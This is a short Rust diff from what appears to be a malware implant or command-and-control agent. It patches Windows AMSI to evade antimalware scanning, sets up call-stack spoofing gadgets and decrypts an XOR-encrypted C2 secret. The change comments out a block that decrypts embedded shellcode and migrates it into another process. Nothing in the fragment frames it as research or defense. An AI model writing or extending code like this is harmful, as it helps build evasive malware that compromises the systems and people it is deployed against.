@@ -40,12 +40,12 @@ fn main() {
         amsi::patch_amsi();
         spoof::initialize_spoof_gadgets();
 
-        let shellcode = xor_decrypt(ENCRYPTED_SC, &XOR_KEY);
-        debug!("[*] Migrating ({} bytes)", shellcode.len());
-        if migration::self_migrate(&shellcode) {
-            debug!(" [*] Done - exiting");
-            return;
-        }
+        // let shellcode = xor_decrypt(ENCRYPTED_SC, &XOR_KEY);
+        // debug!("[*] Migrating ({} bytes)", shellcode.len());
+        // if migration::self_migrate(&shellcode) {
+        //     debug!(" [*] Done - exiting");
+        //     return;
+        // }
 
         let c2_secret = xor_decrypt(&C2_SECRET_ENC, &XOR_KEY);
 
